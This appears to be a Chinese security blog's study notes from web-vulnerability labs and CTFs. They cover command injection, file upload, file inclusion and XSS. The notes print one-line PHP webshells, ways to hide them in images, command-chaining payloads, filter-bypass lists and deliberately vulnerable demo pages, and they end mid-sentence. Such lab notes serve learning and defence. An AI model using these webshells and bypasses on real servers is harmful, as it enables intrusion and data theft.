class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $target = $_REQUEST[<span class="string">'ip'</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(php_uname(<span class="string">'s'</span>), <span class="string">'Windows NT'</span>)) &#123;</span><br><span class="line">        $cmd = shell_exec(<span class="string">'ping '</span> . $taeget);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>.$cmd.<span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $cmd = shell_exec(<span class="string">'ping -c 3 '</span> . $target);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>.$cmd.<span class="string">'&lt;/pre&gt;'</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>页面通过request获取传入的ip参数，并获取当前系统类型之后拼接相应命令”ping + target IP”并执行，在此过程中IP参数可控，所以在IP可拼接命令。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;&amp;whoami</span><br><span class="line">127.0.0.1;whoami</span><br><span class="line">127.0.0.1||whoami</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 逻辑漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传</title>
      <link href="/2020/01/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2020/01/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h4 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h4><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[fox])?&gt;</span><br></pre></td></tr></table></figure><h4 id="图片一句话木马制作"><a href="#图片一句话木马制作" class="headerlink" title="图片一句话木马制作"></a>图片一句话木马制作</h4><p>cmd制作,进入图片所在目录，copy xx.jpg/b+xx.php/a newxx.jpg<br>winhex制作 在文本最后添加一句话木马，编码另存为新图片</p><h4 id="关于文件格式解析："><a href="#关于文件格式解析：" class="headerlink" title="关于文件格式解析："></a>关于文件格式解析：</h4><p>每种类型的文件无法识别别的文件格式</p><h4 id="js验证本地上传"><a href="#js验证本地上传" class="headerlink" title="js验证本地上传"></a>js验证本地上传</h4><p>1.js判断代码为:onsubmit = “return checkFile()”<br>2.增加允许上传的文件类型.php<br>3.拷贝源代码，删除判断代码，在action处指定上传路径<br>4.上传允许上传的代码，抓包改包</p><h4 id="MIME绕过"><a href="#MIME绕过" class="headerlink" title="MIME绕过:"></a>MIME绕过:</h4><p>修改content-type字段可以上传指定的文件格式<br>文件拓展限制:<br>大小写绕过文件上传（widnows下文件不区分大小写 linux区分）<br>.空格绕过.php.,.php空格都解析为.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.htaccess文件代码:</span><br><span class="line">&lt;Filesmatch&quot;fox&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br><span class="line">把文件名为fox的文件全都以php运行(先上传.htaccess文件再上传文件)</span><br></pre></td></tr></table></figure><h4 id="DATA绕过"><a href="#DATA绕过" class="headerlink" title="::$DATA绕过"></a>::$DATA绕过</h4><h4 id="Apache解析漏洞-读取文件时从右往左开始判断解析，若遇到不可解析的文件名则跳过。1-php-xxx-1-php"><a href="#Apache解析漏洞-读取文件时从右往左开始判断解析，若遇到不可解析的文件名则跳过。1-php-xxx-1-php" class="headerlink" title="Apache解析漏洞,读取文件时从右往左开始判断解析，若遇到不可解析的文件名则跳过。1.php.xxx=1.php"></a>Apache解析漏洞,读取文件时从右往左开始判断解析，若遇到不可解析的文件名则跳过。1.php.xxx=1.php</h4><h4 id="内容验证文件上传"><a href="#内容验证文件上传" class="headerlink" title="内容验证文件上传:"></a>内容验证文件上传:</h4><p>文件头上传绕过，在一句话木马php文件前面加上jpg，png，gif图片文件的开头可以绕过检测</p><h4 id="00截断"><a href="#00截断" class="headerlink" title="%00截断:"></a>%00截断:</h4><p>0x00是十六进制表示方法，是ascii码为0的字符，在有些函数处理时，会把这个字符当作结束符，可用于对文件类型名的绕过<br>get可以自动转换，post需要特殊转换（选中进行url格式转换）</p><h4 id="iis6-0解析漏洞"><a href="#iis6-0解析漏洞" class="headerlink" title="iis6.0解析漏洞"></a>iis6.0解析漏洞</h4><p>1.目录解析<br>以<em>.asp命名的文件夹里的文件都会被当成asp文件执行<br>比如1.asp/1.jpg，1.jpg会被当做asp文件执行<br>2.文件解析<br>*.asp;.jpg在;后面的被直接忽略，当成</em>.asp文件执行</p><h4 id="编辑器漏洞"><a href="#编辑器漏洞" class="headerlink" title="编辑器漏洞:"></a>编辑器漏洞:</h4><p>1.不需要后台验证直接可以进行操作(御剑扫描进行目标爆破)<br>2.需要后台管理登录才能够操作<br>常用的编辑器:FCKeditor,EWEbeditor,CKFinder,UEDITOR<br>FCKeditor:突破建立文件夹,实质是利用iis6的目录解析<br>EWEbeditor遍历漏洞<br>ewebeditor/admin_uploadfile.asp?id=14&amp;dir=../</p><h4 id="iis7-0以上高版本漏洞"><a href="#iis7-0以上高版本漏洞" class="headerlink" title="iis7.0以上高版本漏洞"></a>iis7.0以上高版本漏洞</h4><p>1.jpg/.php，在1.jpg中写入一句话木马，因为.php不存在但是会用php来解析，就会读取1.jpg，这其中的一句话就会被执行</p><h3 id="常见文件头"><a href="#常见文件头" class="headerlink" title="常见文件头"></a>常见文件头</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">JPEG (jpg)，             　文件头：FFD8FF　　　　　　　　　　　　　　</span><br><span class="line">PNG (png)，            　　 文件头：89504E47 文件尾：0000000049454E44AE426082</span><br><span class="line">GIF (gif)，              　　文件头：47494638</span><br><span class="line">ZIP Archive (zip)，           文件头：504B0304 文件尾：00000000</span><br><span class="line">TIFF (tif)，              　  文件头：49492A00</span><br><span class="line">Windows Bitmap (bmp)，      文件头：424D</span><br><span class="line">CAD (dwg)，               文件头：41433130</span><br><span class="line">Adobe Photoshop (psd)，      文件头：38425053</span><br><span class="line">Rich Text Format (rtf)，       文件头：7B5C727466</span><br><span class="line">XML (xml)，                文件头：3C3F786D6C</span><br><span class="line">HTML (html)，              文件头：68746D6C3E</span><br><span class="line">Email [thorough only] (eml)，   文件头：44656C69766572792D646174653A</span><br><span class="line">Outlook Express (dbx)，       文件头：CFAD12FEC5FD746F</span><br><span class="line">Outlook (pst)，             文件头：2142444E</span><br><span class="line">MS Word&#x2F;Excel (xls.or.doc)，    文件头：D0CF11E0</span><br><span class="line">MS Access (mdb)，           文件头：5374616E64617264204A</span><br><span class="line">WordPerfect (wpd)，          文件头：FF575043</span><br><span class="line">Adobe Acrobat (pdf)，        文件头：255044462D312E</span><br><span class="line">Quicken (qdf)，             文件头：AC9EBD8F</span><br><span class="line">Windows Password (pwl)，     文件头：E3828596</span><br><span class="line">RAR Archive (rar)，           文件头：52617221</span><br><span class="line">Wave (wav)，               文件头：57415645</span><br><span class="line">AVI (avi)，                 文件头：41564920</span><br><span class="line">Real Audio (ram)，           文件头：2E7261FD</span><br><span class="line">Real Media (rm)，            文件头：2E524D46</span><br><span class="line">MPEG (mpg)，              文件头：000001BA</span><br><span class="line">MPEG (mpg)，              文件头：000001B3</span><br><span class="line">Quicktime (mov)，           文件头：6D6F6F76</span><br><span class="line">Windows Media (asf)，        文件头：3026B2758E66CF11</span><br><span class="line">MIDI (mid)，                文件头：4D546864</span><br></pre></td></tr></table></figure><h3 id="部分MIME表"><a href="#部分MIME表" class="headerlink" title="部分MIME表"></a>部分MIME表</h3><table><thead><tr><th><code>.aac</code></th><th align="center">AAC audio</th><th><code>audio/aac</code></th></tr></thead><tbody><tr><td><code>.abw</code></td><td align="center"><a href="https://en.wikipedia.org/wiki/AbiWord" target="_blank" rel="noopener">AbiWord</a> document</td><td><code>application/x-abiword</code></td></tr><tr><td><code>.arc</code></td><td align="center">Archive document (multiple files embedded)</td><td><code>application/x-freearc</code></td></tr><tr><td><code>.avi</code></td><td align="center">AVI: Audio Video Interleave</td><td><code>video/x-msvideo</code></td></tr><tr><td><code>.azw</code></td><td align="center">Amazon Kindle eBook format</td><td><code>application/vnd.amazon.ebook</code></td></tr><tr><td><code>.bin</code></td><td align="center">Any kind of binary data</td><td><code>application/octet-stream</code></td></tr><tr><td><code>.bmp</code></td><td align="center">Windows OS/2 Bitmap Graphics</td><td><code>image/bmp</code></td></tr><tr><td><code>.bz</code></td><td align="center">BZip archive</td><td><code>application/x-bzip</code></td></tr><tr><td><code>.bz2</code></td><td align="center">BZip2 archive</td><td><code>application/x-bzip2</code></td></tr><tr><td><code>.csh</code></td><td align="center">C-Shell script</td><td><code>application/x-csh</code></td></tr><tr><td><code>.css</code></td><td align="center">Cascading Style Sheets (CSS)</td><td><code>text/css</code></td></tr><tr><td><code>.csv</code></td><td align="center">Comma-separated values (CSV)</td><td><code>text/csv</code></td></tr><tr><td><code>.doc</code></td><td align="center">Microsoft Word</td><td><code>application/msword</code></td></tr><tr><td><code>.docx</code></td><td align="center">Microsoft Word (OpenXML)</td><td><code>application/vnd.openxmlformats-officedocument.wordprocessingml.document</code></td></tr><tr><td><code>.gif</code></td><td align="center">Graphics Interchange Format (GIF)</td><td><code>image/gif</code></td></tr><tr><td><code>.htm.html</code></td><td align="center">HyperText Markup Language (HTML)</td><td><code>text/html</code></td></tr><tr><td><code>.jpeg</code> <code>.jpg</code></td><td align="center">JPEG images</td><td><code>image/jpeg</code></td></tr><tr><td><code>.js</code></td><td align="center">JavaScript</td><td><code>text/javascript</code></td></tr><tr><td><code>.json</code></td><td align="center">JSON format</td><td><code>application/json</code></td></tr><tr><td><code>.mp3</code></td><td align="center">MP3 audio</td><td><code>audio/mpeg</code></td></tr><tr><td><code>.png</code></td><td align="center">Portable Network Graphics</td><td><code>image/png</code></td></tr><tr><td><code>.pdf</code></td><td align="center">Adobe <a href="https://acrobat.adobe.com/us/en/why-adobe/about-adobe-pdf.html" target="_blank" rel="noopener">Portable Document Format</a> (PDF)</td><td><code>application/pdf</code></td></tr><tr><td><code>.ppt</code></td><td align="center">Microsoft PowerPoint</td><td><code>application/vnd.ms-powerpoint</code></td></tr><tr><td><code>.sh</code></td><td align="center">Bourne shell script</td><td><code>application/x-sh</code></td></tr><tr><td><code>.svg</code></td><td align="center">Scalable Vector Graphics (SVG)</td><td><code>image/svg+xml</code></td></tr><tr><td><code>tif.tiff</code></td><td align="center">Tagged Image File Format (TIFF)</td><td><code>image/tiff</code></td></tr><tr><td><code>.txt</code></td><td align="center">Text, (generally ASCII or ISO 8859-<em>n</em>)</td><td><code>text/plain</code></td></tr><tr><td><code>.xml</code></td><td align="center"><code>XML</code></td><td><code>application/xml</code> 代码对普通用户来说不可读 (<a href="https://tools.ietf.org/html/rfc3023#section-3" target="_blank" rel="noopener">RFC 3023</a>, section 3) <code>text/xml</code> 代码对普通用户来说可读 (<a href="https://tools.ietf.org/html/rfc3023#section-3" target="_blank" rel="noopener">RFC 3023</a>, section 3)</td></tr></tbody></table><h4 id="后记：百度杯upload"><a href="#后记：百度杯upload" class="headerlink" title="后记：百度杯upload"></a>后记：百度杯upload</h4><p>为何可以直接上传后缀为 pht 或 phtml 绕过黑名单呢？</p><p>php的conf文件中是有一个正则的后缀名限制的，只要符合都可以被当做php文件执行。</p><p>符合的后缀包括 php、php3、php4、php5、phtml、pht 等。</p><p>什么环境下可以解析 phtml 和 pht 呢？</p><p>1，phpstudy和wamp以及centos用yum方式 安装的lamp环境不能解析phtml和pht</p><p>2，ubuntu和debian利用apt-get方式安装的lamp环境 就能解析phtml和pht</p><p>利用这些环境特性和黑名单就能绕过限制，达到上传webshell的目的。</p><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h4 id="php文件包含的形式"><a href="#php文件包含的形式" class="headerlink" title="php文件包含的形式"></a>php文件包含的形式</h4><p>&lt;?php<br>    $file = $_GET[‘file’];<br>    if(isset($file)){<br>    include(“$file”);<br>    //require();<br>    //require_once();<br>    //include_once();<br>    }else{<br>        echo “file fail”<br>    }</p><h4 id="php中引发文件包含就漏洞的通常是以下四个函数："><a href="#php中引发文件包含就漏洞的通常是以下四个函数：" class="headerlink" title="php中引发文件包含就漏洞的通常是以下四个函数："></a>php中引发文件包含就漏洞的通常是以下四个函数：</h4><p>include()<br>include_once()<br>require()<br>require_once()<br>注：require()如果在包含过程中出错，比如文件不存在等，会直接退出不执行后续语句.<br>include()如果出错会提出警告，后续语句会继续执行<br>文件包含漏洞的场景:<br>1.具有相关的文件包含函数<br>2.文件包含函数中存在动态变量，比如include $file;.<br>3.攻击者能够控制该变量,比如$file = $_GET[‘file’];.</p><h4 id="分类"><a href="#分类" class="headerlink" title="分类:"></a>分类:</h4><p>1.LFI(Local File Inclusion)<br>本地文件包含漏洞，指能打开并包含本地文件的漏洞，大部分情况下遇到的都是本地包含。<br>2.RFI(Remote File Inclusion)<br>远程文件包含漏洞，只能够包含远程服务器上的文件并执行，由于远程文件包含漏洞是我们可控的<br>，因此漏洞一旦存在危害就很大利用条件较为苛刻，需要PHP.INI中进行配置<br>1.allow_url_fopen = On<br>2.allow_url_include = On</p><h3 id="做题过程遇到的补充"><a href="#做题过程遇到的补充" class="headerlink" title="做题过程遇到的补充:"></a>做题过程遇到的补充:</h3><p>可以爆出当前目录下的所有文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">php</span>&gt;</span><span class="actionscript">system(<span class="string">"ls"</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>allow_url_include为On，用<a href="php://input">php://input</a>伪协议进行包含</p><p>php://filter/read=convert.base64-encode/recource=index.php;</p><p>这句话的意思是我们用base64编码的方式来读文件index.php；</p><p>若后台代码过滤了&lt;?和php关键字可以用大小写绕过php关键字，用HTML绕过&lt;?</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"pHp"</span>&gt;</span><span class="javascript">@<span class="built_in">eval</span>($_POST[<span class="string">'sb'</span>])</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>重新根据upload-labs-master做的整理：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1.允许.jpg|.png|.gif</span><br><span class="line">绕过方法：禁用js，或者添加|.php允许马上传，或者上传jpg文件再抓包修改后缀为.php</span><br><span class="line">2.只对content-type进行处理，可以修改为图片的格式image&#x2F;jpeg、image&#x2F;png、image&#x2F;gif</span><br><span class="line">3.用黑名单不允许上传.asp,.aspx,.php,.jsp后缀的文件</span><br><span class="line">但可以上传.phtml .phps .php5 .pht</span><br><span class="line">4.黑名单过滤除了.htaccess所有的后缀名，先上传.htaccess，再上传jpg马</span><br><span class="line">5.大小写未过滤，可以用大小写绕过WAF</span><br><span class="line">6.未对后缀名进行去空，可以加空格绕过</span><br><span class="line">7.未对点绕过，可以用1.php.来绕过，利用windows特性，会自动去掉后缀名中最后的”.”</span><br><span class="line">8.没有对后缀名中的’::$DATA’进行过滤，可以在后缀名加::$DATA绕过文件名+&quot;::$DATA&quot;会把::$DATA之后的数据当成文件流处理,不会检测后缀名</span><br><span class="line">9.利用1.php. .（点+空格+点）来绕过</span><br><span class="line">10. $file_name &#x3D; str_ireplace($deny_ext,&quot;&quot;, $file_name);黑名单过滤将后缀名替换为空，双写可以绕过</span><br><span class="line">11.白名单判断$img_path &#x3D; $_GET[&#39;save_path&#39;].&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;直接拼接，可以用%00绕过</span><br><span class="line">12.save_path参数通过POST方式传递，还是利用00截断，因为POST不会像GET对%00进行自动解码，所以需要在二进制中进行修改</span><br><span class="line">13.getimagesize函数判断文件类型，php_exif模块来判断文件类型，通过读文件的前2个字节判断文件类型，都可以用图片马的方式绕过</span><br><span class="line">14.二次渲染绕过</span><br><span class="line">15.条件竞争，先将文件上传到服务器，然后判断文件后缀是否在白名单里，如果在则重命名，否则删除，因此我们可以上传1.php只需要在它删除之前访问即可，可以利用burp的intruder模块不断上传，然后我们不断的访问刷新该地址即可，有move和renameFile函数的可以通过不断上传图片马，由于条件竞争可能来不及重命名，从而上传成功。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Xss</title>
      <link href="/2020/01/14/Xss/"/>
      <url>/2020/01/14/Xss/</url>
      
        <content type="html"><![CDATA[<h4 id="1-Xss漏洞简介"><a href="#1-Xss漏洞简介" class="headerlink" title="1.Xss漏洞简介"></a>1.Xss漏洞简介</h4><a id="more"></a><p>跨站脚本攻击是指恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。<br> xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以xss漏洞关键就是<strong>寻找参数未过滤的输出函数</strong>。<br> 常见的输出函数有： <code>echo printf print print_r sprintf die var-dump var_export</code>.</p><h4 id="2-Xss分类"><a href="#2-Xss分类" class="headerlink" title="2.Xss分类"></a>2.Xss分类</h4><p>反射型XSS：恶意攻击者通过往web页面中插入恶意html代码，当用户访问该网页时该代码会被触发执行，从而达到攻击用户的目的。</p><p>存储型XSS：攻击数据被写入了数据库中，每当有用户访问该页面的时候都会触发代码执行，这种XSS非常危险，容易造成蠕虫，大量盗窃cookie。</p><p>DOM型XSS：严格意义上应该归属到反射型XSS，并没有恶意代码存储到数据库内。DOMXSS基于文档对象模型，像一些用户可以操纵的，如url、location、refelter,脚本程序可以通过DOM动态检查和修改页面内容。</p><h4 id="3-1反射型XSS"><a href="#3-1反射型XSS" class="headerlink" title="3.1反射型XSS"></a>3.1反射型XSS</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt; </span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt; </span><br><span class="line">&lt;title&gt;XSS&lt;&#x2F;title&gt; </span><br><span class="line">&lt;&#x2F;head&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;get&quot;&gt; </span><br><span class="line">&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;input&quot;&gt;     </span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot;&gt; </span><br><span class="line">&lt;&#x2F;form&gt; </span><br><span class="line">&lt;br&gt; </span><br><span class="line">&lt;?php </span><br><span class="line">$XssReflex &#x3D; $_GET[&#39;input&#39;];</span><br><span class="line">echo &#39;output:&lt;br&gt;&#39;.$XssReflex;</span><br><span class="line">?&gt; </span><br><span class="line">&lt;&#x2F;body&gt; </span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>在谷歌浏览器中输入localhost/Xsstest.php,会进入页面，输入1时点提交会出现这样的页面</p><img src="/2020/01/14/Xss/1.png" class=""><p>这是正常的页面，但是当我们输入</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">'XSS'</span>)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>页面就会有弹窗出现,说明输入的js代码被成功执行了</p><img src="/2020/01/14/Xss/2.png" class=""><p>接下来我们看一下网页源代码，会发现多出了一行</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">'xss'</span>)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><img src="/2020/01/14/Xss/3.png" class=""><p>通过这个弹窗知道js代码可被执行，当我们输入一些其他函数，比如<code>document.cookie</code>就可以成功盗取用户的cookie信息，或者读取用户浏览器信息。</p><p>3.2存储型XSS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;span style&#x3D;&quot;font-size:18px;&quot;&gt;&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&#x2F;&gt;  </span><br><span class="line">&lt;html&gt;  </span><br><span class="line">&lt;head&gt;  </span><br><span class="line">&lt;title&gt;XssStorage&lt;&#x2F;title&gt;  </span><br><span class="line">&lt;&#x2F;head&gt;  </span><br><span class="line">&lt;body&gt;  </span><br><span class="line">&lt;h2&gt;Message Board&lt;h2&gt;  </span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;XssStorage.php&quot; method&#x3D;&quot;post&quot;&gt;  </span><br><span class="line">Message:&lt;textarea id&#x3D;&#39;Mid&#39; name&#x3D;&quot;desc&quot;&gt;&lt;&#x2F;textarea&gt;  </span><br><span class="line">&lt;br&gt;  </span><br><span class="line">&lt;br&gt;  </span><br><span class="line">Subuser:&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;user&quot;&#x2F;&gt;&lt;br&gt; </span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot; onclick&#x3D;&#39;loction&#x3D;&quot;XssStorage.php&quot;&#39;&#x2F;&gt;  </span><br><span class="line">&lt;&#x2F;form&gt;  </span><br><span class="line">&lt;?php  </span><br><span class="line">if(isset($_POST[&#39;user&#39;])&amp;&amp;isset($_POST[&#39;desc&#39;]))&#123;  </span><br><span class="line">$log&#x3D;fopen(&quot;sql.txt&quot;,&quot;a&quot;);  </span><br><span class="line">fwrite($log,$_POST[&#39;user&#39;].&quot;\r\n&quot;);  </span><br><span class="line">fwrite($log,$_POST[&#39;desc&#39;].&quot;\r\n&quot;);  </span><br><span class="line">fclose($log);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">if(file_exists(&quot;sql.txt&quot;))  </span><br><span class="line">&#123;  </span><br><span class="line">$read&#x3D; fopen(&quot;sql.txt&quot;,&#39;r&#39;);  </span><br><span class="line">while(!feof($read))  </span><br><span class="line">&#123;  </span><br><span class="line">    echo fgets($read).&quot;&lt;&#x2F;br&gt;&quot;;  </span><br><span class="line">&#125;  </span><br><span class="line">fclose($read);  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;  </span><br><span class="line">&lt;&#x2F;body&gt;  </span><br><span class="line">&lt;&#x2F;html&gt;&lt;&#x2F;span&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这个页面采用POST提交数据，生成、读取文本模拟数据库，提交数据之后页面会将数据写入sql.txt，再打开页面时会读取sql.txt中内容并显示在网页上，实现了存储型xss攻击模拟。</span><br></pre></td></tr></table></figure><p>直接输入</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">'XSS'</span>)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>好了，下面是网页呈现的效果</p><img src="/2020/01/14/Xss/4.png" class=""><p>这个弹窗可能会被认为跟上面的一样，其实不一样，这句js代码被写入了数据库当中，也就是说你一直刷新这个代码会一直被执行</p><img src="/2020/01/14/Xss/5.png" class=""><p>这就是所谓的存储型XSS漏洞，一次提交之后，每当有用户访问这个页面都会受到XSS攻击，危害巨大。</p><p>php中xss的漏洞防范方法总结：&lt;参考自Segmentfault&gt;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">A.PHP直接输出html的，可以采用以下的方法进行过滤：</span><br><span class="line"></span><br><span class="line">    1.htmlspecialchars函数</span><br><span class="line">    2.htmlentities函数</span><br><span class="line">    3.HTMLPurifier.auto.php插件</span><br><span class="line">    4.RemoveXss函数</span><br><span class="line"></span><br><span class="line">B.PHP输出到JS代码中，或者开发Json API的，则需要前端在JS中进行过滤：</span><br><span class="line"></span><br><span class="line">    1.尽量使用innerText(IE)和textContent(Firefox),也就是jQuery的text()来输出文本内容</span><br><span class="line">    2.必须要用innerHTML等等函数，则需要做类似php的htmlspecialchars的过滤</span><br><span class="line"></span><br><span class="line">C.其它的通用的补充性防御手段</span><br><span class="line"></span><br><span class="line">    1.在输出html时，加上Content Security Policy的Http Header</span><br><span class="line">    （作用：可以防止页面被XSS攻击时，嵌入第三方的脚本文件等）</span><br><span class="line">    （缺陷：IE或低版本的浏览器可能不支持）</span><br><span class="line">    2.在设置Cookie时，加上HttpOnly参数</span><br><span class="line">    （作用：可以防止页面被XSS攻击时，Cookie信息被盗取，可兼容至IE6）</span><br><span class="line">    （缺陷：网站本身的JS代码也无法操作Cookie，而且作用有限，只能保证Cookie的安全）</span><br><span class="line">    3.在开发API时，检验请求的Referer参数</span><br><span class="line">    （作用：可以在一定程度上防止CSRF攻击）</span><br><span class="line">    （缺陷：IE或低版本的浏览器中，Referer参数可以被伪造）</span><br></pre></td></tr></table></figure><p>XSS-games略有心得</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1.无任何过滤&lt;script&gt;alert(1);&lt;&#x2F;script&gt;</span><br><span class="line">2.带有&lt;input&gt;标签，先闭合参数再进行XSS注入</span><br><span class="line">3.尖括号被解析，用onclick事件包含在&lt;&gt;内,onclick&#x3D;&#39;javascript:alert(1)&#39;</span><br><span class="line">4.onclick,script都被过滤,用href方法&lt;a href&#x3D;javasacript:alert(1)&gt;</span><br><span class="line">5.href script onclick 都被过滤了 可以尝试下大小写绕过</span><br><span class="line">6.对 on href script 